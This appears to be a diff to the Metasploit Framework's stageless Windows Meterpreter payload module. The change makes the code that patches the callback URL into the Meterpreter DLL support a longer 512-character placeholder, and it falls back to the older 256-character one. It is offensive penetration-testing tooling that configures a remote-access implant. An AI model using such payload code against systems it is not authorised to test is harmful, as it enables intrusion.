@@ -1,6 +1,7 @@
 #-*- coding: binary -*-
 
 require 'msf/core'
+require 'rex/payloads/meterpreter/patch'
 
 module Msf
 
@@ -75,10 +76,12 @@ module Payload::Windows::StagelessMeterpreter
 
     # the URL might not be given, as it might be patched in some other way
     if url
-      url = "s#{url}\x00"
-      location = dll.index("https://#{'X' * 256}")
-      if location
-        dll[location, url.length] = url
+      # Patch the URL using the patcher as this upports both ASCII and WCHAR.
+      unless Rex::Payloads::Meterpreter::Patch.patch_string!(dll, "https://#{'X' * 512}", "s#{url}\x00")
+        # If the patching failed this could mean that we are somehow
+        # working with outdated binaries, so try to patch with the
+        # old stuff.
+        Rex::Payloads::Meterpreter::Patch.patch_string!(dll, "https://#{'X' * 256}", "s#{url}\x00")
       end
     end
 
